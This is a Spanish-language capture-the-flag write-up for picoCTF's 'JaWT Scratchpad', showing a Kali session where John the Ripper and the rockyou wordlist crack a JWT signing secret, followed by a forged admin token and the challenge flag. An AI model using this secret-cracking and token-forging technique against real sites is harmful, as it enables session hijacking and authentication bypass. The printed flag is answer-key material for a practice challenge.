# JaWT Scratchpad

## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090
## Solución
```bash
┌──(kali㉿kali)-[~]
└─$ nano hash

┌──(kali㉿kali)-[~]
└─$ cat hash 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGF2aWQifQ.A3oybMNHdvAm9h1IeP6tjw_FdG7CvmgIWn4YZ4tWZaE

┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
amass  dirbuster      fern-wifi  legion      nmap.lst        sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt.gz  wfuzz

┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists/rockyou.txt             
/usr/share/wordlists/rockyou.txt

┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists/           
amass  dirbuster      fern-wifi  legion      nmap.lst     sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz

┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123

┌──(kali㉿kali)-[~]
└─$ john                                 
Created directory: /home/kali/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.                                                                                        
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:04 DONE (2023-10-08 20:29) 0.2293g/s 1696Kp/s 1696Kc/s 1696KC/s iloveqmc..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

picoCTF{jawt_was_just_what_you_thought_f859ab2f}
```
## Notas adicionales
Se utilizo cookie editor para ver las cookies que se generan cuando se ingresa un usuario, luego se llevó a jwt para decodificar dicha cookie, para luego en kali usar el comando john con la cookie que teníamos y aplicar una lista de palabras de contraseñas comunes, dándonos ilovepico, donde llevamos esto a jwt y lo cambiamos por dicha contraseña, solo cambiamos la cookie y se nos proporciona la llave.
## Referencias
https://es.wikipedia.org/wiki/JSON
https://jwt.io/introduction
https://github.com/openwall/john